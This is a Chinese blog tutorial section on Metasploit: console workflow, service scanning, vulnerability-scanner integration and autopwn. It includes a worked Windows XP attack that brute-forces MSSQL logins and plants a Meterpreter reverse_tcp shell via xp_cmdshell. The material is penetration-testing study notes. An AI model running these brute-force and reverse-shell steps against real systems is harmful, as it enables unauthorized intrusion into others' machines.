+<h2 id="2-Metasploit"><a href="#2-Metasploit" class="headerlink" title="2. Metasploit"></a>2. Metasploit</h2><h3 id="2-1-一次简单的使用流程"><a href="#2-1-一次简单的使用流程" class="headerlink" title="2.1 一次简单的使用流程"></a>2.1 一次简单的使用流程</h3><h4 id="启动MSF"><a href="#启动MSF" class="headerlink" title="启动MSF"></a>启动MSF</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; msfconsole</span><br></pre></td></tr></table></figure>
+
+<h4 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; search wordpress</span><br></pre></td></tr></table></figure>
+
+<h4 id="选择漏洞利用exp"><a href="#选择漏洞利用exp" class="headerlink" title="选择漏洞利用exp"></a>选择漏洞利用exp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use xxx</span><br></pre></td></tr></table></figure>
+
+<h4 id="设置攻击载荷（Payload）"><a href="#设置攻击载荷（Payload）" class="headerlink" title="设置攻击载荷（Payload）"></a>设置攻击载荷（Payload）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 'show options' means showing the advandce options to custom. e.g.</span></span><br><span class="line">&gt; msf exploit(windows/mysql/mysql_mof) &gt; show options</span><br></pre></td></tr></table></figure>
+
+<h4 id="设置攻击选项"><a href="#设置攻击选项" class="headerlink" title="设置攻击选项"></a>设置攻击选项</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set the information about the exploit process. e.g.</span></span><br><span class="line">&gt; <span class="built_in">set</span> RHOST 115.28.xxx.xxx</span><br></pre></td></tr></table></figure>
+
+<h4 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit it!</span></span><br><span class="line">&gt; exploit</span><br></pre></td></tr></table></figure>
+
+<h4 id="建立会话"><a href="#建立会话" class="headerlink" title="建立会话"></a>建立会话</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有会话</span></span><br><span class="line">&gt; sessions -l</span><br><span class="line"><span class="comment"># 进入1号会话</span></span><br><span class="line">&gt; sessions –i 1 </span><br><span class="line"><span class="comment"># 查询攻击者的身份</span></span><br><span class="line">&gt; getuid</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-一些组件"><a href="#2-2-一些组件" class="headerlink" title="2.2 一些组件"></a>2.2 一些组件</h3><h4 id="Payload生成器"><a href="#Payload生成器" class="headerlink" title="Payload生成器"></a>Payload生成器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msfpayload已被弃用</span></span><br><span class="line">&gt; msfpayload -h</span><br><span class="line"><span class="comment"># 现使用msfvenom </span></span><br><span class="line">&gt; msfvenom -h</span><br></pre></td></tr></table></figure>
+
+<h4 id="数据库子系统"><a href="#数据库子系统" class="headerlink" title="数据库子系统"></a>数据库子系统</h4><p>可创建数据库子系统，用于存储测试过程中的数据。支持Postgre SQL，MySQL，SQLite3数据库。</p>
+<p>//TODO</p>
+<p><a href="https://blog.csdn.net/FunkyPants/article/details/78483792" target="_blank" rel="noopener">https://blog.csdn.net/FunkyPants/article/details/78483792</a></p>
+<h3 id="2-3-情报搜集"><a href="#2-3-情报搜集" class="headerlink" title="2.3 情报搜集"></a>2.3 情报搜集</h3><p>记录的详细与否是一次渗透测试成败的关键点</p>
+<h4 id="被动信息搜集-Passive-Information-Gathering"><a href="#被动信息搜集-Passive-Information-Gathering" class="headerlink" title="被动信息搜集(Passive Information Gathering)"></a>被动信息搜集(Passive Information Gathering)</h4><p>这里的主动与被动所指的是，是不是与目标主机直接进行交互。如果不是直接进行交互，例如使用Shodan查询，这些就是被动信息搜集（我们利用网络上其他“人”提供给我们的信息，因此我们是被动获取信息的）。相反地，与目标服务器直接进行交互，例如使用Nmap进行扫描，就是主动的信息搜集了。</p>
+<h5 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h5><p>确定网络资产所有者的相关信息</p>
+<h5 id="DNS-查询"><a href="#DNS-查询" class="headerlink" title="DNS 查询"></a>DNS 查询</h5><ol>
+<li>netlookup<br>终端工具，可以直接查看域名对应的IP信息</li>
+</ol>
+<h4 id="主动信息搜集-Positive-information-Gathering"><a href="#主动信息搜集-Positive-information-Gathering" class="headerlink" title="主动信息搜集(Positive information Gathering)"></a>主动信息搜集(Positive information Gathering)</h4><ol>
+<li>使用Nmap</li>
+</ol>
+<p>上文👆</p>
+<ol start="2">
+<li>框架提供的扫描工具<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search portscan</span><br><span class="line"><span class="comment"># 使用syn扫描器（TCP/IP握手包）</span></span><br><span class="line">msf &gt; use scanner/portscan/syn</span><br><span class="line">msf &gt; <span class="built_in">set</span>...</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h4 id="针对性扫描"><a href="#针对性扫描" class="headerlink" title="针对性扫描"></a>针对性扫描</h4><h5 id="服务器消息块协议扫描"><a href="#服务器消息块协议扫描" class="headerlink" title="服务器消息块协议扫描"></a>服务器消息块协议扫描</h5><p>利用Microsoft制定的网络通讯协议中表示块中的SMB（服务器信息块协议），遍历网络，获取Windows系统版本号。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/smb/smb_version</span><br><span class="line">msf &gt; <span class="built_in">set</span>...</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+
+<h5 id="Microsoft-SQL-Server扫描"><a href="#Microsoft-SQL-Server扫描" class="headerlink" title="Microsoft SQL Server扫描"></a>Microsoft SQL Server扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/mssql/mssql_ping</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h5 id="SSH服务扫描"><a href="#SSH服务扫描" class="headerlink" title="SSH服务扫描"></a>SSH服务扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/ssh/ssh_version</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h5 id="FTP扫描"><a href="#FTP扫描" class="headerlink" title="FTP扫描"></a>FTP扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/ftp/ftp_version</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h5 id="SNMP（简单网管协议）扫描"><a href="#SNMP（简单网管协议）扫描" class="headerlink" title="SNMP（简单网管协议）扫描"></a>SNMP（简单网管协议）扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/snmp/snmp_login</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h5 id="自制扫描器"><a href="#自制扫描器" class="headerlink" title="自制扫描器"></a>自制扫描器</h5><h3 id="2-4-漏洞扫描"><a href="#2-4-漏洞扫描" class="headerlink" title="2.4 漏洞扫描"></a>2.4 漏洞扫描</h3><h4 id="NeXpose"><a href="#NeXpose" class="headerlink" title="NeXpose"></a>NeXpose</h4><p>Rapid7公司的一款漏洞扫描产品，有社区免费版。可使用Web端图形化显示（localhost:3780），也可使用MSF终端启动。  </p>
+<h5 id="生成报告导入MSF"><a href="#生成报告导入MSF" class="headerlink" title="生成报告导入MSF"></a>生成报告导入MSF</h5><p>创建一个新数据库（参见上文），使用<code>db_connect</code>连接，使用<code>db_import</code>导入XML格式的报告。使用<code>db_hosts</code>测试是否倒入成功。使用<code>db_vulns</code>查看导入漏洞的详细信息。</p>
+<h5 id="在MSF内使用NeXpose"><a href="#在MSF内使用NeXpose" class="headerlink" title="在MSF内使用NeXpose"></a>在MSF内使用NeXpose</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除现有库</span></span><br><span class="line">msf &gt; de_destory postgres:pass@127.0.0.1/msf3</span><br><span class="line"><span class="comment"># 创建一个新库</span></span><br><span class="line">msf &gt; de_connect postgres:pass@127.0.0.1/msf3</span><br><span class="line"><span class="comment"># 载入nexpose插件</span></span><br><span class="line">msf &gt; load nexpose</span><br><span class="line"><span class="comment"># 显示导入的nexpose的帮助</span></span><br><span class="line">msf &gt; <span class="built_in">help</span></span><br><span class="line"><span class="comment"># 第一次连接需要设置安装的nexpose实例</span></span><br><span class="line">msf &gt; nexpose_connect -h</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 扫描目标地址</span></span><br><span class="line">msf &gt; nexpose_scan xxx.xxx.xxx.xxx</span><br><span class="line"><span class="comment"># 扫描后，结果已存在数据库</span></span><br><span class="line">msf &gt; db_hosts -c address</span><br><span class="line">msf &gt; db_vulns</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h4><p>默认端口为为8834，使用步骤与NeXpose相同👆</p>
+<h4 id="专用漏洞扫描器"><a href="#专用漏洞扫描器" class="headerlink" title="专用漏洞扫描器"></a>专用漏洞扫描器</h4><h5 id="SMB-Login-check"><a href="#SMB-Login-check" class="headerlink" title="SMB Login check"></a>SMB Login check</h5><p>对Windows主机的用户名和口令进行破解。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_login</span><br><span class="line">msf &gt; show options</span><br></pre></td></tr></table></figure>
+
+<h5 id="VNC空口令扫描"><a href="#VNC空口令扫描" class="headerlink" title="VNC空口令扫描"></a>VNC空口令扫描</h5><p>VNC即虚拟网络计算，提供远程访问系统桌面的服务。新版本的VNC不再允许使用VNC，并且绝大多数情况会一无所获。但渗透环境是多样的，以及一个优秀的渗透测试工程师会对目标采取千方百计的手段。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">msf &gt; show options</span><br></pre></td></tr></table></figure>
+
+<h5 id="X11服务器扫描"><a href="#X11服务器扫描" class="headerlink" title="X11服务器扫描"></a>X11服务器扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search x11</span><br><span class="line">...</span><br><span class="line">msf &gt; use auxiliary/scanner/x11/open_x11</span><br></pre></td></tr></table></figure>
+<p>X系统用于处理包括鼠标和键盘在内的图形用户界面，我们可以结合Back|Track的xray工具对目标的键盘输入进行记录。</p>
+<h4 id="利用扫描结果自动化攻击"><a href="#利用扫描结果自动化攻击" class="headerlink" title="利用扫描结果自动化攻击"></a>利用扫描结果自动化攻击</h4><p>使用Metasploit的autopwn工具，根据漏洞扫描器的结果自动进行渗透攻击。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_connect portgres:pass@127.0.0.1/msf3</span><br><span class="line">msf &gt; db_import your_nessues_export_file_path</span><br><span class="line">msf &gt; du_autopwn -e -t -r -x -p</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>使用db_autopwn命令后自动进行渗透攻击，其参数含义如下：<br>|argument|implication|<br>|— | —-|<br>|-e|对所有目标发起进攻|<br>|-t|显示所有匹配的模块|<br>|-r|利用反弹shell的payload|<br>|-x|根据漏洞选择攻击模块|<br>|-p|根据开放端口选择攻击模块|</p>
+<p>后面会对该模块进行详细介绍。</p>
+<h3 id="渗透测试执行标准"><a href="#渗透测试执行标准" class="headerlink" title="渗透测试执行标准"></a>渗透测试执行标准</h3><h3 id="Exploit-db-com"><a href="#Exploit-db-com" class="headerlink" title="Exploit-db.com"></a>Exploit-db.com</h3><p>一个综合性的软件脆弱性和漏洞信息收集平台，它为软件开发者、安全漏洞研究人员、渗透测试者提供了大量的有关于各个操作系统、主流软件应用的脆弱性信息或漏洞利用程序</p>
+<h3 id="渗透攻击之旅"><a href="#渗透攻击之旅" class="headerlink" title="渗透攻击之旅"></a>渗透攻击之旅</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><h5 id="show-exploits"><a href="#show-exploits" class="headerlink" title="show exploits"></a>show exploits</h5><h5 id="show-auxiliary"><a href="#show-auxiliary" class="headerlink" title="show auxiliary"></a>show auxiliary</h5><h5 id="show-options"><a href="#show-options" class="headerlink" title="show options"></a>show options</h5><h5 id="show-payloads"><a href="#show-payloads" class="headerlink" title="show payloads"></a>show payloads</h5><h5 id="show-targets"><a href="#show-targets" class="headerlink" title="show targets"></a>show targets</h5><h5 id="search"><a href="#search" class="headerlink" title="search"></a>search</h5><p>根据关键词搜索攻击模块</p>
+<h5 id="back"><a href="#back" class="headerlink" title="back"></a>back</h5><h5 id="use"><a href="#use" class="headerlink" title="use"></a>use</h5><h5 id="set-amp-unset"><a href="#set-amp-unset" class="headerlink" title="set &amp; unset"></a>set &amp; unset</h5><p>变量不必须为大写，但这是个好习惯</p>
+<h5 id="setg-amp-unsetg"><a href="#setg-amp-unsetg" class="headerlink" title="setg &amp; unsetg"></a>setg &amp; unsetg</h5><p>对全局参数进行设置或清楚</p>
+<h5 id="save"><a href="#save" class="headerlink" title="save"></a>save</h5><p>保存setg设置的全局变量，下次启动msfconsole时继续使用</p>
+<h5 id="info"><a href="#info" class="headerlink" title="info"></a>info</h5><h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h5 id="e-g-攻击一台Windows-XP"><a href="#e-g-攻击一台Windows-XP" class="headerlink" title="e.g. 攻击一台Windows XP"></a>e.g. 攻击一台Windows XP</h5><ol>
+<li>扫描端口服务</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap -sT -A -PO xxx.xxx</span><br></pre></td></tr></table></figure>
+<p>发现MS SQL服务  </p>
+<ol start="2">
+<li>攻击MS SQL，TCP默认端口一般为1433，UDP默认端口为1434</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap -sU xxx.xxx -p1434</span><br><span class="line">msf &gt; use scanner/mssql/mssql_ping</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>暴力破解MS SQL</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/mssql/mssql_login</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; <span class="built_in">set</span> PASS_FILE /xxx/xxx/xxx.txt</span><br><span class="line">...</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure>
+<p>补充：Fast-Track工具</p>
+<ol start="4">
+<li>注入Meterpreter shell<br>因为是XP系统，所以我们利用xp_cmdshell进行交互，进一步的思路是上传Meterpreter shell来更深入的渗透。<br>方便的是，MSF已经含有一个<strong>模块</strong>，可以实现通过xp_cmdshell来植入任意Metasploit攻击载荷（如Meterpreter），过程如下：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use windows/mssql/mssql_payload</span><br><span class="line">msf &gt; show options</span><br><span class="line"><span class="comment"># 设置自己选择的payload</span></span><br><span class="line">msf &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; <span class="built_in">set</span> LHOST //TODO</span><br><span class="line">msf &gt; <span class="built_in">set</span> LPORT 443</span><br><span class="line">...</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><h3 id="常用端口及服务"><a href="#常用端口及服务" class="headerlink" title="常用端口及服务"></a>常用端口及服务</h3><p>离线网站保存</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://y1ng.cc/" target="_blank" rel="noopener">BBS</a></li>
+         
+          <li><a href="https://y1ng.org/TheRoadOfSO/">安全运营之路</a></li>
+         
+          <li><a href="https://cissp-wiki.ml/" target="_blank" rel="noopener">CISSP学习指南</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透测试工具学习（一）"><span class="toc-number">1.</span> <span class="toc-text">渗透测试工具学习（一）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.1.</span> <span class="toc-text">Reference</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Nmap"><span class="toc-number">1.2.</span> <span class="toc-text">1. Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参数选择"><span class="toc-number">1.2.1.</span> <span class="toc-text">参数选择</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.2.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#选项总览-线下备用"><span class="toc-number">1.2.3.</span> <span class="toc-text">选项总览[线下备用]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口扫描"><span class="toc-number">1.2.4.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Metasploit"><span class="toc-number">1.3.</span> <span class="toc-text">2. Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-一次简单的使用流程"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.1 一次简单的使用流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#启动MSF"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">启动MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#搜索漏洞"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">搜索漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#选择漏洞利用exp"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">选择漏洞利用exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#设置攻击载荷（Payload）"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">设置攻击载荷（Payload）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#设置攻击选项"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">设置攻击选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开始攻击"><span class="toc-number">1.3.1.6.</span> <span class="toc-text">开始攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#建立会话"><span class="toc-number">1.3.1.7.</span> <span class="toc-text">建立会话</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-一些组件"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.2 一些组件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload生成器"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">Payload生成器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据库子系统"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">数据库子系统</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-情报搜集"><span class="toc-number">1.3.3.</span> <span class="toc-text">2.3 情报搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#被动信息搜集-Passive-Information-Gathering"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">被动信息搜集(Passive Information Gathering)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#whois"><span class="toc-number">1.3.3.1.1.</span> <span class="toc-text">whois</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS-查询"><span class="toc-number">1.3.3.1.2.</span> <span class="toc-text">DNS 查询</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#主动信息搜集-Positive-information-Gathering"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">主动信息搜集(Positive information Gathering)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#针对性扫描"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">针对性扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#服务器消息块协议扫描"><span class="toc-number">1.3.3.3.1.</span> <span class="toc-text">服务器消息块协议扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Microsoft-SQL-Server扫描"><span class="toc-number">1.3.3.3.2.</span> <span class="toc-text">Microsoft SQL Server扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH服务扫描"><span class="toc-number">1.3.3.3.3.</span> <span class="toc-text">SSH服务扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FTP扫描"><span class="toc-number">1.3.3.3.4.</span> <span class="toc-text">FTP扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SNMP（简单网管协议）扫描"><span class="toc-number">1.3.3.3.5.</span> <span class="toc-text">SNMP（简单网管协议）扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#自制扫描器"><span class="toc-number">1.3.3.3.6.</span> <span class="toc-text">自制扫描器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-漏洞扫描"><span class="toc-number">1.3.4.</span> <span class="toc-text">2.4 漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NeXpose"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">NeXpose</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#生成报告导入MSF"><span class="toc-number">1.3.4.1.1.</span> <span class="toc-text">生成报告导入MSF</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#在MSF内使用NeXpose"><span class="toc-number">1.3.4.1.2.</span> <span class="toc-text">在MSF内使用NeXpose</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nessus"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">Nessus</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#专用漏洞扫描器"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">专用漏洞扫描器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SMB-Login-check"><span class="toc-number">1.3.4.3.1.</span> <span class="toc-text">SMB Login check</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#VNC空口令扫描"><span class="toc-number">1.3.4.3.2.</span> <span class="toc-text">VNC空口令扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#X11服务器扫描"><span class="toc-number">1.3.4.3.3.</span> <span class="toc-text">X11服务器扫描</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用扫描结果自动化攻击"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">利用扫描结果自动化攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#渗透测试执行标准"><span class="toc-number">1.3.5.</span> <span class="toc-text">渗透测试执行标准</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-db-com"><span class="toc-number">1.3.6.</span> <span class="toc-text">Exploit-db.com</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#渗透攻击之旅"><span class="toc-number">1.3.7.</span> <span class="toc-text">渗透攻击之旅</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用命令"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#show-exploits"><span class="toc-number">1.3.7.1.1.</span> <span class="toc-text">show exploits</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#show-auxiliary"><span class="toc-number">1.3.7.1.2.</span> <span class="toc-text">show auxiliary</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#show-options"><span class="toc-number">1.3.7.1.3.</span> <span class="toc-text">show options</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#show-payloads"><span class="toc-number">1.3.7.1.4.</span> <span class="toc-text">show payloads</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#show-targets"><span class="toc-number">1.3.7.1.5.</span> <span class="toc-text">show targets</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#search"><span class="toc-number">1.3.7.1.6.</span> <span class="toc-text">search</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#back"><span class="toc-number">1.3.7.1.7.</span> <span class="toc-text">back</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#use"><span class="toc-number">1.3.7.1.8.</span> <span class="toc-text">use</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#set-amp-unset"><span class="toc-number">1.3.7.1.9.</span> <span class="toc-text">set &amp; unset</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#setg-amp-unsetg"><span class="toc-number">1.3.7.1.10.</span> <span class="toc-text">setg &amp; unsetg</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#save"><span class="toc-number">1.3.7.1.11.</span> <span class="toc-text">save</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#info"><span class="toc-number">1.3.7.1.12.</span> <span class="toc-text">info</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#e-g-攻击一台Windows-XP"><span class="toc-number">1.3.7.2.1.</span> <span class="toc-text">e.g. 攻击一台Windows XP</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#杂"><span class="toc-number">1.4.</span> <span class="toc-text">杂</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用端口及服务"><span class="toc-number">1.4.1.</span> <span class="toc-text">常用端口及服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">1.4.2.</span> <span class="toc-text"></span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://y1ng.org/2019/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/&text=渗透测试工具学习" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
